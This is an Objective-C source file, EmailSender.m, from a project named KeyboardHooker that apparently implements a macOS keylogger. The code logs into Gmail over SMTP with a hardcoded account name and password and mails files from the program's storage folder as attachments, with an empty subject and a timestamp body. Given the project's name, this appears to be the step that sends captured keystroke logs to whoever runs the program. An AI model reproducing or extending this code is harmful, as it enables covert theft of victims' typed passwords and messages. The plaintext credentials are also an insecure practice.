//
//  EmailSender.m
//  KeyboardHooker
//
//  Created by Иван on 01.12.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "EmailSender.h"

@implementation EmailSender

+ (void)sendEmailWithMail: (NSString *)toAddress Attachments: (NSArray *)attachments {
    MCOSMTPSession *smtpSession = [[MCOSMTPSession alloc] init];
    smtpSession.hostname = @"smtp.gmail.com";
    smtpSession.port = 465;
    smtpSession.username = @"keyboardhoooker@gmail.com";
    smtpSession.password = @"keyhook12";
    smtpSession.authType = MCOAuthTypeSASLPlain;
    smtpSession.connectionType = MCOConnectionTypeTLS;
    
    MCOMessageBuilder *builder = [[MCOMessageBuilder alloc] init];
    MCOAddress *from = [MCOAddress addressWithDisplayName:@"keyhooker" mailbox:@"keyboardhoooker@gmail.com"];
    MCOAddress *to = [MCOAddress addressWithDisplayName:nil mailbox:toAddress];
    [[builder header] setFrom:from];
    [[builder header] setTo:@[to]];
    [[builder header] setSubject:@""];
    
    
    for (int i = 0; i < [attachments count]; i++) {
        NSString *path = [NSString stringWithFormat:@"%@%@", [FileManager pathToFile], attachments[i]];
        
        MCOAttachment *att = [MCOAttachment attachmentWithData:[NSData dataWithContentsOfFile:path] filename:attachments[i]];
        [builder addAttachment:att];
    }
    
    // Текст сообщения
    [builder setHTMLBody:[Time currentFullTime]];
    NSData * rfc822Data = [builder data];
    
    MCOSMTPSendOperation *sendOperation =
    [smtpSession sendOperationWithData:rfc822Data];
    
    [sendOperation start:^(NSError *error) {
        if(error) {
            NSLog(@"Error sending email: %@", error);
        } else {
            NSLog(@"Successfully sent email!");
        }
    }];
}

@end
